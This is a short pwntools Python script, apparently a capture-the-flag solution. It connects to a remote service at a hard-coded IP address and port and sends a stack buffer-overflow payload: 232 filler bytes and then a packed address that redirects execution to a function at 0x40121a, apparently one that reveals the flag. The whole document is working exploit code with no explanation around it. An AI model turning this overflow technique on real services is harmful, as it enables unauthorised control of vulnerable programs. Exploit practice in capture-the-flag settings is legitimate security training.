from pwn import *

context.binary = './chall'
context.arch = 'amd64'

p = remote('152.118.201.210', 2601)

offset = 232
flag_addr = 0x40121a

payload = b"A" * offset
payload += p64(flag_addr)

p.recvuntil(b"Enter your input:")
p.sendline(payload)

p.interactive()